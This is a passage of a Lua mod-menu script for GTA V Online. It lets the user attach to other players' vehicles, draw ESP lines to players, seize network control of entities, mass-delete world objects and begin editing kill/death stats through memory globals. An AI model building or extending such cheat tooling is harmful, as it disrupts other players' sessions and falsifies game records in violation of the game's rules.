    end)

    local vehattach = menu.list(vehicle, "Attachment Options", {}, "Attach To Players Vehicle")

    menu.action(vehattach, "Detach", {"detach"}, "unstuck yourself \nDetach Will Not Work When Spectating", function()
        local car = PED.GET_VEHICLE_PED_IS_IN(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(player_id), false)
        ENTITY.DETACH_ENTITY(players.user_ped(), car, false, false)
        if player_cur_car ~= 0 then
            ENTITY.DETACH_ENTITY(player_cur_car, false, false)
        end
        ENTITY.DETACH_ENTITY(players.user_ped(), false, false)
    end)

menu.action(vehattach, "Attach to BMX", {""}, "Use Ledge Sit animation to properly sit on the player's bars", function()
    local car = PED.GET_VEHICLE_PED_IS_IN(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(player_id), true)
    if car ~= 0 then
        ENTITY.ATTACH_ENTITY_TO_ENTITY(players.user_ped(), car, 0, 0.0--[[x]], 0.5--[[z]], 0.4--[[y]], 0.0--[[verticle (flip)]], 0.0--[[horizontal (go sideways)]], 0.0--[[w (turn)]], 1.0, 1, true, true, true, true, 0, true)
    end
end)

menu.action(vehattach, "Attach to Addon Car Hood", {""}, "Use Ledge Sit animation to properly sit on the player's car", function()
    local car = PED.GET_VEHICLE_PED_IS_IN(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(player_id), true)
    if car ~= 0 then
        ENTITY.ATTACH_ENTITY_TO_ENTITY(players.user_ped(), car, 0, 0.5--[[x]], 1.9--[[z]], 0--[[y]], 0.0--[[verticle (flip)]], 0.0--[[horizontal (go sideways)]], 0.0--[[w (turn)]], 1.0, 1, true, true, true, true, 0, true)
    end
end)

menu.action(vehattach, "Attach Floating", {""}, "Attach to player's car (syncs for everyone)", function()
    local car = PED.GET_VEHICLE_PED_IS_IN(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(player_id), true)
    if car ~= 0 then
        ENTITY.ATTACH_ENTITY_TO_ENTITY(players.user_ped(), car, 0, 0.0--[[x]], -1.60--[[z]], 3.3--[[y]], 0.0--[[verticle (flip)]], 0.0--[[horizontal (go sideways)]], 0.0--[[w (turn)]], 1.0, 1, true, true, true, true, 0, true)
    end
end)

menu.action(vehattach, "Attach to Car Roof", {""}, "Attach to player's car (syncs for everyone)", function()
    local car = PED.GET_VEHICLE_PED_IS_IN(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(player_id), true)
    if car ~= 0 then
        ENTITY.ATTACH_ENTITY_TO_ENTITY(players.user_ped(), car, 0, 0.0, -0.20, 2.00, 0.0--[[verticle (flip)]], 0.0--[[horizontal (go sideways)]], 0.0--[[w (turn)]], 1.0, 1, true, true, true, true, 0, true)
    end
end)

menu.action(vehattach, "Attach to Car Trunk", {""}, "Attach to player's car (syncs for everyone)", function()
    local car = PED.GET_VEHICLE_PED_IS_IN(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(player_id), true)
    if car ~= 0 then
        ENTITY.ATTACH_ENTITY_TO_ENTITY(players.user_ped(), car, 0, 0.0--[[x]], -1.60--[[z]], 1.60--[[y]], 0.0--[[verticle (flip)]], 0.0--[[horizontal (go sideways)]], 0.0--[[w (turn)]], 1.0, 1, true, true, true, true, 0, true)
    end
end)
	
    ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
    -- Other

    menu.toggle_loop(Few, "ESP", {}, "Will draw a line directly to player.", function()
        local c = ENTITY.GET_ENTITY_COORDS(players.user_ped())
        local p = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(player_id)
        local j = ENTITY.GET_ENTITY_COORDS(p)
        GRAPHICS.DRAW_LINE(c.x, c.y, c.z, j.x, j.y, j.z, 255, 255, 255, 255)
    end)
	
	
end)

players.dispatch_on_join()

-------------------------------------------------------------------------------------------------------------------------------------------------

--==Menu's==--
local selfc = menu.list(uwuself, "Main", {}, "Main Options.")
local weapons = menu.list(uwuself, "Weapons", {}, "")
local online = menu.list(uwuonline, "FewMod", {}, "Online mode options")
local world = menu.list(uwuworld, "FewMod QOL", {}, "Quality Of Life Options For The World")
local world2 = menu.list(uwuworld, "FewMod Fun", {}, "Fun Options For The World")
local detections = menu.list(uwuonline, "FewMod Detection", {}, "Lua Detections")
local protects = menu.list(uwuonline, "FewMod Protections", {}, "Lua Protections")
local vehicles = menu.list(uwuvehicle, "FewMod", {}, "Vehicle Options")
local fun = menu.list(uwuself, "Fun", {}, "Fun Stuff To Mess With")
local animations = menu.list(uwuself, "Animations", {}, "")
local misc = menu.list(uwustand, "Misc", {}, "Useful and fast shortcuts")
--local update = menu.action(menu.my_root(), "Github Link", {}, "Link To Github For Manual Updates")

local discordlink = menu.hyperlink(menu.my_root(), "Discord", "https://discord.gg/EN4RrZR", "My Discord Server - If You Have Any Issues This Is The Easiest Way To Let Me Know")
local running = menu.divider(menu.my_root(), "Script Running")
local versionnumber = menu.divider(menu.my_root(), "Version: "..localversion)

-------------------------------------------------------------------------------------------------------------------------------------------------

local function get_player_vehicle_handles()
    local player_vehicle_handles = {}
    for _, player_id in pairs(players.list()) do
        local player_ped = PLAYER.GET_PLAYER_PED(player_id)
        local veh = PED.GET_VEHICLE_PED_IS_IN(player_ped, false)
        if not ENTITY.IS_ENTITY_A_VEHICLE(veh) then
            veh = PED.GET_VEHICLE_PED_IS_IN(player_ped, true)
        end
        if not ENTITY.IS_ENTITY_A_VEHICLE(veh) then
            veh = 0
        end
        if veh then
            player_vehicle_handles[player_id] = veh
        end
    end
    return player_vehicle_handles
end

local function is_entity_occupied(entity, type, player_vehicle_handles)
    local occupied = false
    if type == "VEHICLE" then
        for _, vehicle_handle in pairs(player_vehicle_handles) do
            if entity == vehicle_handle then
                occupied = true
            end
        end
    end
    return occupied
end

local function delete_entities_by_range(my_entities, range, type)
    local player_vehicle_handles = get_player_vehicle_handles()
    local player_pos = ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(players.user()), 1)
    local count = 0
    for _, entity in ipairs(my_entities) do
        local entity_pos = ENTITY.GET_ENTITY_COORDS(entity, 1)
        local dist = SYSTEM.VDIST(player_pos.x, player_pos.y, player_pos.z, entity_pos.x, entity_pos.y, entity_pos.z)
        if dist <= range then
            if not is_entity_occupied(entity, type, player_vehicle_handles) then
                entities.delete_by_handle(entity)
                count = count + 1
            end
        end
    end
    return count
end

local function clear_references(attachment)
    attachment.root = nil
    attachment.parent = nil
    if attachment.children then
        for _, child_attachment in pairs(attachment.children) do
            clear_references(child_attachment)
        end
    end
end

menu.action(world, "Remove Traffic", {"removetraffic"}, "Will remove all peds in vehicles arond the world. \nNetWorked", function(toggle)
    local pop_multiplier_id
    if toggle then
        local ped_sphere, traffic_sphere
        if util.disable_peds then ped_sphere = 0.0 else ped_sphere = 1.0 end
        if util.disable_traffic then traffic_sphere = 0.0 else traffic_sphere = 1.0 end
        pop_multiplier_id = MISC.ADD_POP_MULTIPLIER_SPHERE(1.1, 1.1, 1.1, 20000.0, ped_sphere, traffic_sphere, false, true)
        MISC.CLEAR_AREA(1.1, 1.1, 1.1, 30000.0, true, false, false, true)
    else
        MISC.REMOVE_POP_MULTIPLIER_SPHERE(pop_multiplier_id, false);
    end
end)

menu.toggle_loop(world, "No Traffic", {}, "", function()
    menu.trigger_commands("removetraffic")
    util.yield(0500)
end)

menu.toggle_loop(world, "Turn off Horns", {}, "Will put off all horns nearby you.", function()
    for _, vehicle in ipairs(entities.get_all_vehicles_as_handles()) do
        AUDIO.SET_HORN_ENABLED(vehicle, false)
    end
end)

local function request_control2(entity, timeout)
    local end_time = os.time() + (timeout or 5)
    NETWORK.NETWORK_REQUEST_CONTROL_OF_ENTITY(entity)
    while not NETWORK.NETWORK_HAS_CONTROL_OF_ENTITY(entity) and end_time >= os.time() do
        NETWORK.NETWORK_REQUEST_CONTROL_OF_ENTITY(entity)
    end
    return NETWORK.NETWORK_HAS_CONTROL_OF_ENTITY(entity)
end

YOINK_PEDS = false
YOINK_VEHICLES = false
YOINK_OBJECTS = false
YOINK_PICKUPS = false

YOINK_RANGE = 500

Yoinkshit = false

local getEntityCoords2 = ENTITY.GET_ENTITY_COORDS
local getPlayerPed2 = PLAYER.GET_PLAYER_PED

local yoinkSettings = menu.list(uwuworld, "Force Request Control Settings", {}, "")


menu.toggle(yoinkSettings, "Force Request Control", {"controlall"}, "", function (yoink)
    if yoink then
        Yoinkshit = true
        util.create_thread(function()
            while Yoinkshit do
                local yoinksq = YOINK_RANGE^2
                local localCoord = getEntityCoords2(getPlayerPed2(players.user()))
                local BigTable = {}
                if YOINK_PEDS then
                    local pedTable = entities.get_all_peds_as_pointers()
                    for i = 1, #pedTable do
                        local coord = entities.get_position(pedTable[i])
                        local distsq = SYSTEM.VDIST2(coord.x, coord.y, coord.z, localCoord.x, localCoord.y, localCoord.z)
                        local handle = entities.pointer_to_handle(pedTable[i])
                        if not PED.IS_PED_A_PLAYER(handle) then
                            if distsq <= yoinksq then
                                BigTable[#BigTable+1] = handle
                            end
                        end
                    end
                end
                util.yield()
                if YOINK_VEHICLES then
                    local vehTable = entities.get_all_vehicles_as_pointers()
                    for i = 1, #vehTable do
                        local coord = entities.get_position(vehTable[i])
                        local distsq = SYSTEM.VDIST2(coord.x, coord.y, coord.z, localCoord.x, localCoord.y, localCoord.z)
                        if distsq <= yoinksq then
                            BigTable[#BigTable+1] = entities.pointer_to_handle(vehTable[i])
                        end
                    end
                end
                util.yield()
                if YOINK_OBJECTS then
                    local objTable = entities.get_all_objects_as_pointers()
                    for i = 1, #objTable do
                        local coord = entities.get_position(objTable[i])
                        local distsq = SYSTEM.VDIST2(coord.x, coord.y, coord.z, localCoord.x, localCoord.y, localCoord.z)
                        if distsq <= yoinksq then
                            BigTable[#BigTable+1] = entities.pointer_to_handle(objTable[i])
                        end
                    end
                end
                if YOINK_PICKUPS then
                    local pickTable = entities.get_all_pickups_as_pointers()
                    for i = 1, #pickTable do
                        local coord = entities.get_position(pickTable[i])
                        local distsq = SYSTEM.VDIST2(coord.x, coord.y, coord.z, localCoord.x, localCoord.y, localCoord.z)
                        if distsq <= yoinksq then
                            BigTable[#BigTable+1] = entities.pointer_to_handle(pickTable[i])
                        end
                    end
                end
                for i = 1, #BigTable do
                    NETWORK.NETWORK_REQUEST_CONTROL_OF_ENTITY(BigTable[i])
                    util.yield()
                end
                util.toast("Requested control of all")
                ----
                util.yield()
            end
            util.stop_thread()
        end)
    else
        Yoinkshit = false
    end
end)

menu.slider(yoinkSettings, "Range For Request Control", {"controlrange"}, "", 1, 5000, 5000, 10, function (value)
    YOINK_RANGE = value
end)
menu.toggle(yoinkSettings, "Peds", {}, "", function (peds)
    YOINK_PEDS = peds
end)
menu.toggle(yoinkSettings, "Vehicles", {}, "", function (vehs)
    YOINK_VEHICLES = vehs
end)
menu.toggle(yoinkSettings, "Objects", {}, "", function (objs)
    YOINK_OBJECTS = objs
end)
menu.toggle(yoinkSettings, "Pickups", {}, "", function (pick)
    YOINK_PICKUPS = pick
end)

menu.action(uwuworld, "Delete Objects", {"clearobj1"}, "Deletes All Objects", function(on_click)
    local player_pos = ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(players.user()), 1)
    local ot = 0
    for k,ent in pairs(entities.get_all_objects_as_handles()) do
        entities.delete_by_handle(ent)
        ot += 1
    end
    util.yield_once()
end)


menu.action(uwuworld, "Delete Vehicles", {"clearveh1"}, "Deletes All Cars", function(on_click)
    local player_pos = ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(players.user()), 1)
    local vt = 0
    for k,ent in pairs(entities.get_all_vehicles_as_handles()) do
        local driver = VEHICLE.GET_PED_IN_VEHICLE_SEAT(ent, -1)
        if not PED.IS_PED_A_PLAYER(driver) then
            entities.delete_by_handle(ent)
            vt += 1
        end
    end
    util.yield_once()
end)

menu.action(uwuworld, "Delete Peds", {"clearpeds1"}, "Deletes All Pedestrians", function(on_click)
    local player_pos = ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(players.user()), 1)
    local pt = 0
    for k,ent in pairs(entities.get_all_peds_as_handles()) do
        if not PED.IS_PED_A_PLAYER(ent) then
            entities.delete_by_handle(ent)
        end
        pt += 1
    end
    util.yield_once()
end)

menu.action(uwuworld, "Delete Ropes", {"clearropes1"}, "Deletes All Ropes", function(on_click)
    local ct = 0
    local rope_alloc = memory.alloc(4)
    for i=0, 100 do 
        memory.write_int(rope_alloc, i)
        if PHYSICS.DOES_ROPE_EXIST(rope_alloc) then   
            PHYSICS.DELETE_ROPE(rope_alloc)
            ct += 1
        end
    end
    util.yield_once()
end)


menu.action(uwuworld, "Clean World/Super Cleanse", {"clearworld"}, "Literally cleans everything in the area including peds, cars, objects, bools etc.", function(on_click)
    local player_pos = ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(players.user()), 1)
    GRAPHICS.REMOVE_PARTICLE_FX_IN_RANGE(player_pos.x, player_pos.y, player_pos.z, 1000000)
    menu.trigger_commands("clearropes1")
    menu.trigger_commands("clearpeds1")
    menu.trigger_commands("clearveh1")
    menu.trigger_commands("clearobj1")
    util.yield(150)
    clear_area(10000)
end)

--------------------------------------------------------------------------------------------------------------------------------
--Detections

local veh_things = {
    "brickade2",
    "hauler",
    "hauler2",
    "manchez3",
    "terbyte",
    "minitank",
    "rcbandito"
}

menu.toggle_loop(detections, "Non-Buyable/Unreleased/Modded Vehicles", {}, "Detects if a player has a Non-Buyable, Unreleased or Modded Vehicle", function()
    for _, player_id in ipairs(players.list(false, true, true)) do
        local modelHash = players.get_vehicle_model(player_id)
        for i, name in ipairs(Fewd.modded_vehicles) do
            if modelHash == util.joaat(name) then
                util.draw_debug_text(players.get_name(player_id) .. " - Non-Buyable or Unreleased/Modded Vehicle")
                break
            end
        end
    end
end)

menu.toggle_loop(detections, "Super Drive", {}, "Detects if a player is using Super Drive.", function()
    for _, player_id in ipairs(players.list(true, true, true)) do
        local ped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(player_id)
        local vehicle = PED.GET_VEHICLE_PED_IS_USING(ped)
        local veh_speed = (ENTITY.GET_ENTITY_SPEED(vehicle)* 3.0107)
        local class = VEHICLE.GET_VEHICLE_CLASS(vehicle)
        if class ~= 15 and class ~= 16 and veh_speed >= 186 and VEHICLE.GET_PED_IN_VEHICLE_SEAT(vehicle, -1) and players.get_vehicle_model(player_id) ~= util.joaat("oppressor") then -- not checking opressor mk1
        util.draw_debug_text(PLAYER.GET_PLAYER_NAME(player_id) .. " Is Using Super Drive")
            break
        end
    end
end)

menu.toggle_loop(detections, "Modded Weapon", {}, "Detects if a player is using a Modded Weapon", function()
    for _, player_id in ipairs(players.list(true, true, true)) do
        local ped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(player_id)
        local modelHash = WEAPON.GET_SELECTED_PED_WEAPON(ped)
        for i, hash in ipairs(Fewd.modded_weapons) do
            local weapon_hash = util.joaat(hash)
            if WEAPON.HAS_PED_GOT_WEAPON(ped, weapon_hash, false) and (WEAPON.IS_PED_ARMED(ped, 7) or TASK.GET_IS_TASK_ACTIVE(ped, 8) or TASK.GET_IS_TASK_ACTIVE(ped, 9)) then
                if modelHash == weapon_hash then
                    util.draw_debug_text(PLAYER.GET_PLAYER_NAME(player_id) .. " Is Using a Modded Weapon ".. "(" .. util.reverse_joaat(WEAPON.GET_SELECTED_PED_WEAPON(ped, weapon_hash, false)) .. ")")
                    break
                end
            end
        end
    end
end)

--------------------------------------------------------------------------------------------------------------------------------
--Self

local customrespawnmenu = menu.list(selfc, "Custom Respawn", {}, "")

local wasDead = false
local respawnPos
local respawnRot
custom_respawn_toggle = menu.toggle_loop(customrespawnmenu, "Custom Respawn Location", {}, "Set a location that you respawn at when you die.", function()
    if respawnPos == nil then return end
    local isDead = PLAYER.IS_PLAYER_DEAD(players.user())
    if wasDead and not isDead then
        while PLAYER.IS_PLAYER_DEAD(players.user()) do
            util.yield_once()
        end
        for i = 0, 30 do
            ENTITY.SET_ENTITY_COORDS_NO_OFFSET(players.user_ped(), respawnPos.x, respawnPos.y, respawnPos.z, false, false, false)
            --ENTITY.SET_ENTITY_ROTATION(players.user_ped(), respawnRot.x, respawnRot.y, respawnRot.z 2, true)
            util.yield_once()
        end
    end
    wasDead = isDead
end)

local function getZoneName(player_id)
    return util.get_label_text(ZONE.GET_NAME_OF_ZONE(v3.get(players.get_position(player_id))))
end

custom_respawn_location = menu.action(customrespawnmenu, "Save Location", {}, "", function()
    respawnPos = players.get_position(players.user())
    respawnRot = ENTITY.GET_ENTITY_ROTATION(players.user_ped(), 2)
    menu.set_menu_name(custom_respawn_toggle, "Custom Respawn" ..": ".. getZoneName(players.user()))
    local rpos = 'X: '.. respawnPos.x ..'\nY: '.. respawnPos.y ..'\nZ: '.. respawnPos.z
    menu.set_help_text(custom_respawn_toggle,  rpos)
    menu.set_help_text(custom_respawn_location,  "Current Location" ..':\n'.. rpos)
end)

local bounty_local = nil
local bounty_timer = nil
local BOUNTY_LOCAL <constexpr> = 2793046 + 1886 + 17
local BOUNTY_TIMER <constexpr> = 2359296 + 1 + (0 * 5568) + 5150 + 13

inc_vehs = true
local rbp = menu.ref_by_path

local outfits = menu.list(selfc, "Outfits", {}, "")
menu.hyperlink(outfits, "Outfits Link", "https://github.com/Fewdys/GTA5-NeptuniaCharacters/tree/main")
local neptunia = menu.list(outfits, "Neptunia Outfits", {}, "Outfits From Neptunia\n(Ingnore If You Dont Have Neptunia DLC)")
local otheroutfits = menu.list(outfits, "Other Outfits", {}, "Other DLC Outfits")

menu.action(neptunia, "Adult Neptune", {"adultneptune"}, "Adult Neptune From Neptunia \n(Ingnore If You Dont Have Neptunia DLC)", function()
        menu.trigger_commands("afygenhot01")
        menu.trigger_commands("allguns")
end)

menu.action(neptunia, "AST", {"ast"}, "AST From Neptunia \n(Ingnore If You Dont Have Neptunia DLC)", function()
    menu.trigger_commands("afyyoga01")
    menu.trigger_commands("allguns")
end)

menu.action(neptunia, "AST Origami", {"astorigami"}, "AST Origami From Neptunia \n(Ingnore If You Dont Have Neptunia DLC)", function()
    menu.trigger_commands("afytopless01")
    menu.trigger_commands("allguns")
end)

menu.action(neptunia, "AST School Outfit", {"astschooloutfit"}, "AST School Outfit From Neptunia \n(Ingnore If You Dont Have Neptunia DLC)", function()
    menu.trigger_commands("afyjuggalo01")
    menu.trigger_commands("allguns")
end)

menu.action(neptunia, "Blanc", {"blanc"}, "Blanc From Neptunia \n(Ingnore If You Dont Have Neptunia DLC)", function()
    menu.trigger_commands("igmarnie")
    menu.trigger_commands("allguns")
end)

menu.action(neptunia, "B-Sha", {"bsha"}, "B-Sha From Neptunia \n(Ingnore If You Dont Have Neptunia DLC)", function()
    menu.trigger_commands("afmprolhost01")
    menu.trigger_commands("allguns")
end)

menu.action(neptunia, "Compa", {"compa"}, "Compa From Neptunia \n(Ingnore If You Dont Have Neptunia DLC)", function()
    menu.trigger_commands("afysoucent01")
    menu.trigger_commands("allguns")
end)

menu.action(neptunia, "C-Sha", {"csha"}, "C-Sha From Neptunia \n(Ingnore If You Dont Have Neptunia DLC)", function()
    menu.trigger_commands("ummspyactor")
    menu.trigger_commands("allguns")
end)

menu.action(neptunia, "Dengekiki", {"dengekiki"}, "Dengekiki From Neptunia \n(Ingnore If You Dont Have Neptunia DLC)", function()
    menu.trigger_commands("sfycop01")
    menu.trigger_commands("allguns")
end)

menu.action(neptunia, "Ethel", {"ethel"}, "Ethel From Neptunia \n(Ingnore If You Dont Have Neptunia DLC)", function()
    menu.trigger_commands("afyvinewood02")
    menu.trigger_commands("allguns")
end)

menu.action(neptunia, "Hatsumi Sega", {"hatsumisega"}, "Hatsumi Sega From Neptunia \n(Ingnore If You Dont Have Neptunia DLC)", function()
    menu.trigger_commands("igmagenta")
    menu.trigger_commands("allguns")
end)

menu.action(neptunia, "IF", {"if"}, "IF From Neptunia \n(Ingnore If You Dont Have Neptunia DLC)", function()
    menu.trigger_commands("afyskater01")
    menu.trigger_commands("allguns")
end)

menu.action(neptunia, "Kotori", {"kotori"}, "Kotori From Neptunia \n(Ingnore If You Dont Have Neptunia DLC)", function()
    menu.trigger_commands("csbanton")
    menu.trigger_commands("allguns")
end)

menu.action(neptunia, "K-Sha", {"ksha"}, "K-Sha From Neptunia \n(Ingnore If You Dont Have Neptunia DLC)", function()
    menu.trigger_commands("afmeastsa01")
    menu.trigger_commands("allguns")
end)

menu.action(neptunia, "Kurome", {"kurome"}, "Kurome From Neptunia \n(Ingnore If You Dont Have Neptunia DLC)", function()
    menu.trigger_commands("smyswat01")
    menu.trigger_commands("allguns")
end)

menu.action(neptunia, "Kurumi", {"kurumi"}, "Kurumi From Neptunia \n(Ingnore If You Dont Have Neptunia DLC)", function()
    menu.trigger_commands("afybevhills01")
    menu.trigger_commands("allguns")
end)

menu.action(neptunia, "Lily", {"lily"}, "Lily From Neptunia \n(Ingnore If You Dont Have Neptunia DLC)", function()
    menu.trigger_commands("afmfatwhite01")
    menu.trigger_commands("allguns")
end)

menu.action(neptunia, "Lola", {"lola"}, "Lola From Neptunia \n(Ingnore If You Dont Have Neptunia DLC)", function()
    menu.trigger_commands("afyrurmeth01")
    menu.trigger_commands("allguns")
end)

menu.action(neptunia, "Mai", {"mai"}, "Mai From Neptunia \n(Ingnore If You Dont Have Neptunia DLC)", function()
    menu.trigger_commands("csbroccopelosi")
    menu.trigger_commands("allguns")
end)

menu.action(neptunia, "Nepgear", {"nepgear"}, "Nepgear From Neptunia \n(Ingnore If You Dont Have Neptunia DLC)", function()
    menu.trigger_commands("cslestercrest2")
    menu.trigger_commands("allguns")
end)

menu.action(neptunia, "Neptune", {"neptune"}, "Neptune From Neptunia \n(Ingnore If You Dont Have Neptunia DLC)", function()
    menu.trigger_commands("ufyspyactress")
    menu.trigger_commands("allguns")
end)

menu.action(neptunia, "Nisa", {"nisa"}, "Nisa From Neptunia \n(Ingnore If You Dont Have Neptunia DLC)", function()
    menu.trigger_commands("afygencaspat01")
    menu.trigger_commands("allguns")
end)

menu.action(neptunia, "Noire", {"noire"}, "Noir From Neptunia \n(Ingnore If You Dont Have Neptunia DLC)", function()
    menu.trigger_commands("afmbevhills01")
    menu.trigger_commands("allguns")
end)

menu.action(neptunia, "Origami", {"origami"}, "Origami From Neptunia \n(Ingnore If You Dont Have Neptunia DLC)", function()
    menu.trigger_commands("afmktown01")
    menu.trigger_commands("allguns")
end)

menu.action(neptunia, "Peashy", {"peashy"}, "Peashy From Neptunia \n(Ingnore If You Dont Have Neptunia DLC)", function()
    menu.trigger_commands("afmfatcult01")
    menu.trigger_commands("allguns")
end)

menu.action(neptunia, "Plutia", {"plutia"}, "Plutia From Neptunia \n(Ingnore If You Dont Have Neptunia DLC)", function()
    menu.trigger_commands("smmarmoured01")
    menu.trigger_commands("allguns")
end)

menu.action(neptunia, "Ram", {"ram"}, "Ram From Neptunia \n(Ingnore If You Dont Have Neptunia DLC)", function()
    menu.trigger_commands("afmsalton01")
    menu.trigger_commands("allguns")
end)

menu.action(neptunia, "Red", {"red"}, "Red From Neptunia \n(Ingnore If You Dont Have Neptunia DLC)", function()
    menu.trigger_commands("afmsoucent02")
    menu.trigger_commands("allguns")
end)

menu.action(neptunia, "Rom", {"rom"}, "Rom From Neptunia \n(Ingnore If You Dont Have Neptunia DLC)", function()
    menu.trigger_commands("afmtourist01")
    menu.trigger_commands("allguns")
end)

menu.action(neptunia, "Rottie", {"rottie"}, "Rottie From Neptunia \n(Ingnore If You Dont Have Neptunia DLC)", function()
    menu.trigger_commands("afoindian01")
    menu.trigger_commands("allguns")
end)

menu.action(neptunia, "Shina", {"shina"}, "Shina From Neptunia \n(Ingnore If You Dont Have Neptunia DLC)", function()
    menu.trigger_commands("afosoucent01")
    menu.trigger_commands("allguns")
end)

menu.action(neptunia, "Tiara", {"tiara"}, "Tiara From Neptunia \n(Ingnore If You Dont Have Neptunia DLC)", function()
    menu.trigger_commands("csbchef")
    menu.trigger_commands("allguns")
end)

menu.action(neptunia, "Tohka", {"tohka"}, "Tohka From Neptunia \n(Ingnore If You Dont Have Neptunia DLC)", function()
    menu.trigger_commands("afybeach01")
    menu.trigger_commands("allguns")
end)

menu.action(neptunia, "Underling", {"underling"}, "Underling From Neptunia \n(Ingnore If You Dont Have Neptunia DLC)", function()
    menu.trigger_commands("afyclubcust03")
    menu.trigger_commands("allguns")
end)

menu.action(neptunia, "Uni", {"uni"}, "Uni From Neptunia \n(Ingnore If You Dont Have Neptunia DLC)", function()
    menu.trigger_commands("igjanet")
    menu.trigger_commands("allguns")
end)

menu.action(neptunia, "Uzume", {"uzume"}, "Uzume From Neptunia \n(Ingnore If You Dont Have Neptunia DLC)", function()
    menu.trigger_commands("afybusiness04")
    menu.trigger_commands("allguns")
end)

menu.action(neptunia, "Vert", {"vert"}, "Vert From Neptunia \n(Ingnore If You Dont Have Neptunia DLC)", function()
    menu.trigger_commands("afyfemaleagent")
    menu.trigger_commands("allguns")
end)

menu.action(neptunia, "Yoshino", {"yoshino"}, "Yoshino From Neptunia \n(Ingnore If You Dont Have Neptunia DLC)", function()
    menu.trigger_commands("igjosef")
    menu.trigger_commands("allguns")
end)

menu.action(otheroutfits, "Emote Guy (Joe)", {"emoteguy"}, "Emote Guy Also Known As Joe", function()
    menu.trigger_commands("ammtranvest01")
    menu.trigger_commands("allguns")
end)

menu.action(otheroutfits, "Fischer", {"fischer"}, "Fischer", function()
    menu.trigger_commands("afysoucent03")
    menu.trigger_commands("allguns")
end)

menu.action(otheroutfits, "Haku", {"haku"}, "Haku", function()
    menu.trigger_commands("afyeastsa03")
    menu.trigger_commands("allguns")
end)

menu.action(otheroutfits, "Inugami Korone", {"inugamikorone"}, "Inugami Korone", function()
    menu.trigger_commands("afysmartcaspat01")
    menu.trigger_commands("allguns")
end)

menu.action(otheroutfits, "KeQing", {"keqing"}, "KeQing", function()
    menu.trigger_commands("afyscdressy01")
    menu.trigger_commands("allguns")
end)

menu.action(otheroutfits, "Rimuru Tempest", {"rimurutempest"}, "Rimuru Tempest", function()
    menu.trigger_commands("ammstlat02")
    menu.trigger_commands("allguns")
end)

menu.action(otheroutfits, "Sally", {"sally"}, "Sally", function()
    menu.trigger_commands("afytennis01")
    menu.trigger_commands("allguns")
end)

menu.action(otheroutfits, "Six Little Nightmares", {"sixlittlenightmares"}, "Six Little Nightmares", function()
    menu.trigger_commands("afmskidrow01")
    menu.trigger_commands("allguns")
end)

--==Full Credit To The Original Creator (Kreeako)==--
local kdedit = menu.list(selfc, "KD Editor", {}, "Please Make Sure You Are In Online To Use This")

menu.divider(kdedit, "Make Sure You're Online While Using This")

local function round(num, numDecimalPlaces)
    local mult = 10^(numDecimalPlaces or 0)
    return math.floor(num * mult + 0.5) / mult
end

local STATS = {
    ["STAT_GET_INT"]=--[[BOOL (bool)]] function(--[[Hash (int)]] statHash,--[[int* (pointer)]] outValue,--[[int]] p2)native_invoker.begin_call()native_invoker.push_arg_int(statHash)native_invoker.push_arg_pointer(outValue)native_invoker.push_arg_int(p2)native_invoker.end_call_2(0x767FBC2AC802EF3D)return native_invoker.get_return_value_bool()end,
    ["STAT_GET_FLOAT"]=--[[BOOL (bool)]] function(--[[Hash (int)]] statHash,--[[float* (pointer)]] outValue,--[[Any (int)]] p2)native_invoker.begin_call()native_invoker.push_arg_int(statHash)native_invoker.push_arg_pointer(outValue)native_invoker.push_arg_int(p2)native_invoker.end_call_2(0xD7AE6C9C9C6AC54C)return native_invoker.get_return_value_bool()end,
    ["STAT_SET_INT"]=--[[BOOL (bool)]] function(--[[Hash (int)]] statName,--[[int]] value,--[[BOOL (bool)]] save)native_invoker.begin_call()native_invoker.push_arg_int(statName)native_invoker.push_arg_int(value)native_invoker.push_arg_bool(save)native_invoker.end_call_2(0xB3271D7AB655B441)return native_invoker.get_return_value_bool()end,
    ["STAT_SET_FLOAT"]=--[[BOOL (bool)]] function(--[[Hash (int)]] statName,--[[float]] value,--[[BOOL (bool)]] save)native_invoker.begin_call()native_invoker.push_arg_int(statName)native_invoker.push_arg_float(value)native_invoker.push_arg_bool(save)native_invoker.end_call_2(0x4851997F37FE9B3C)return native_invoker.get_return_value_bool()end,
}

local mem = {
    alloc = memory.alloc,
    g_global = memory.script_global,
    get_int = memory.read_int,
    get_float = memory.read_float,
}

local kills_ptr  = mem.alloc(4)
local deaths_ptr = mem.alloc(4)
local ratio_ptr  = mem.alloc(4)

-- thank you Sapphire for helping me with reading/writing globals and helping me fix the ratio not being written c:
local global_kills  = mem.g_global(1853910 + 1 + (players.user() * 862) + 205 + 28)
local global_deaths = mem.g_global(1853910 + 1 + (players.user() * 862) + 205 + 29)
local global_ratio  = mem.g_global(1853910 + 1 + (players.user() * 862) + 205 + 26)

local kills_stat_hash  = util.joaat("MPPLY_KILLS_PLAYERS")
local deaths_stat_hash = util.joaat("MPPLY_DEATHS_PLAYER")
local ratio_stat_hash  = util.joaat("MPPLY_KILL_DEATH_RATIO")

util.create_tick_handler(function()

    STATS.STAT_GET_INT(kills_stat_hash, kills_ptr, -1)
    STATS.STAT_GET_INT(deaths_stat_hash, deaths_ptr, -1)
    STATS.STAT_GET_FLOAT(ratio_stat_hash, ratio_ptr, -1)

    get_stat_kills  = mem.get_int(kills_ptr)
    get_stat_deaths = mem.get_int(deaths_ptr)
    get_stat_ratio  = mem.get_float(ratio_ptr)

    get_global_kills  = mem.get_int(global_kills)
    get_global_deaths = mem.get_int(global_deaths)
    get_global_ratio = mem.get_float(global_ratio)

    if get_global_kills == get_stat_kills then
        cur_kills = get_global_kills
    else
        cur_kills = get_stat_kills
    end

    if get_global_deaths == get_stat_deaths then
